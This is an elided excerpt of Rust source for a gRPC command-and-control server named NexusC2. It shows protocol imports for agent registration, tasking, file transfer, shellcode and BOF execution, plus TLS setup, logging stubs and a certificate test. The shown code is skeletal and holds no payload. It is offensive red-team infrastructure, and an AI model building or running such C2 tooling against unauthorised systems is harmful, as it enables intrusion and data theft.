...
use crate::proto::{
    nexus_c2_server, AgentInfoRequest, AgentInfoResponse, BofRequest, BofResponse, FileChunk,
    FileDownloadRequest, FileUploadResponse, HeartbeatRequest, HeartbeatResponse,
    RegistrationRequest, RegistrationResponse, ShellcodeRequest, ShellcodeResponse, Task,
    TaskRequest, TaskResult, TaskResultResponse,
};
use crate::{config::GrpcServerConfig, proto::*, CertManager, InfraError, InfraResult};
    ...
    pub async fn start(&self) -> InfraResult<()> {
        ...
        if cert_chain_pem.is_empty() {
            return Err(InfraError::GrpcError(
                "No certificate chain data available".to_string(),
            ));
        }

        info!(
            "Creating TLS identity with certificate chain ({} bytes)",
            cert_chain_pem.len()
        );
        ...
        // Spawn server task with detailed error logging
...
impl nexus_c2_server::NexusC2 for NexusC2Service {
    ...
    async fn submit_task_result(
        ...
        info!(
            "Received task result for task: {} from agent: {}",
    ...
    async fn upload_file(
        ...
        info!(
            "Received file upload: {} ({} bytes, {} chunks)",
            filename,
            total_size,
            chunks.len()
        );
    ...
    async fn download_file(
        ...
        info!(
            "File download requested: {} for agent: {}",
    ...
    async fn execute_bof(
        ...
        info!(
            "BOF execution requested for agent: {} (function: {})",
    ...
    type GetTasksStream =
        std::pin::Pin<Box<dyn tokio_stream::Stream<Item = Result<Task, Status>> + Send>>;
...
mod tests {
    ...
    async fn test_grpc_server_creation() {
        ...
        let (cert_pem, key_pem) =
            crate::CertManager::generate_self_signed_cert("test.example.com", &[], 30).unwrap();
